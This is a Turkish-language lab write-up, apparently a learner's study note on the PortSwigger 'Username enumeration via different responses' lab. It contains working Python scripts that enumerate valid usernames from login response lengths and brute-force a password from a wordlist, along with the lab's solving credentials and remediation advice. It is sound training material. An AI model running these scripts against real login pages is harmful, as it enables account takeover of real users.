# Authentication Lab #1: username enumeration via different responses (+Python) — 08.11.2026

> Yeni sınıf: Authentication (kimlik doğrulama). Access control "ne yapabilirsin"di; bu "ön kapı — kimliğini kanıtlamak". İlk lab: login'in sızdırdığı farktan geçerli kullanıcıyı bul, sonra şifreyi brute-force et.

**Lab:** PortSwigger → Authentication → Password-based → *Username enumeration via different responses* (Apprentice)
**Görev:** Geçerli kullanıcı adını + şifreyi bul, giriş yap.

## Authentication vs Authorization
- **Authentication** (bu sınıf): "sen gerçekten X misin?" — kimlik kontrolü (ön kapı).
- **Authorization** (access control): "ne yapmana izin var?" — yetki.
Analoji: fedai. Kimliğini kontrol eder (authn) + VIP listesine bakar (authz).

## Çözüm — iki aşama (anomali-yakalama + Python)
Lab iki wordlist veriyor (candidate usernames + passwords), .txt olarak kaydedildi.

**1. aşama — geçerli kullanıcı adı:** her username'i **sabit** bir şifreyle dene, yanıtları `(status, uzunluk)` grupla.
```python
import requests
from collections import defaultdict
url="https://LAB-ID.web-security-academy.net/login"
usernames=open("candidateUsernames.txt").read().split()
groups=defaultdict(list)
for u in usernames:
    r=requests.post(url, data={"username":u, "password":"x"})
    groups[(r.status_code, len(r.text))].append(u)
for k,us in sorted(groups.items(), key=lambda kv: len(kv[1])): print(k, len(us), us[:3])
```
Çıktı: 100 username → `(200, 3244)` (Invalid username), **1 username `albuquerque` → `(200, 3246)`** (farklı uzunluk = "Incorrect password" mesajı). **Sinyal: yanıt uzunluğu.**

**2. aşama — şifre:** username **sabit** (`albuquerque`), password wordlist'ini döndür, `allow_redirects=False`.
```python
username="albuquerque"
passwords=open("candidatePasswords.txt").read().split()
for p in passwords:
    r=requests.post(url, data={"username":username, "password":p}, allow_redirects=False)
    groups[(r.status_code, len(r.text))].append(p)
```
Çıktı: 99 şifre → `(200, 3246)` (Incorrect password), **1 şifre `159753` → `(302, 0)`** (başarılı giriş → redirect). **Sinyal: status kodu (302 vs 200).** → `albuquerque:159753` ile giriş → **Solved.** ✅

## Neden tehlikeli — İKİ şeyin birleşimi
- **(a) Username enumeration:** uygulama geçerli kullanıcıyı farklı yanıtla ele veriyor.
- **(b) Brute-force koruması yok:** 100+100 denemeyi kimse durdurmadı (rate limit/lockout/CAPTCHA yok).
İkisi birlikte → **account takeover.** Tek başına enumeration sınırlı; "kullanıcıyı söyle + sınırsız dene" ölümcül.

## Takıldığı yerler (precision/syntax)
- Dosya okuma: `candidateUsernames.txt` çıplak yazıldı → doğrusu `open("candidateUsernames.txt").read().split()` (string + open).
- 2. aşamada username/password yer değiştirmişti (kopyala-yapıştır) → username sabit, loop değişkeni password alanına.

## 🛡️ Nasıl kapatılır (remediation)
- **Generic hata mesajı:** geçersiz username ve yanlış şifre için **birebir aynı** yanıt ("Invalid username or password") — davranış/uzunluk/status farkı olmasın.
- **Brute-force koruması:** rate limiting, account lockout, CAPTCHA, IP bazlı throttling.
- **MFA** (ikinci faktör).
- Zamanlama farkına da dikkat (timing ile de enumeration mümkün).

## Zincir bağı
- Anomali-yakalama (grupla → farklı olanı bul) SSRF iç-ağ taramasının birebir aynısı; araç yine Python (Community Intruder throttle'lı).
- Access control (içeride ne yaparsın) → authentication (içeri nasıl girersin). Sıradaki auth lab'ları: brute-force koruması atlatma, logic flaw'lar, MFA bypass.
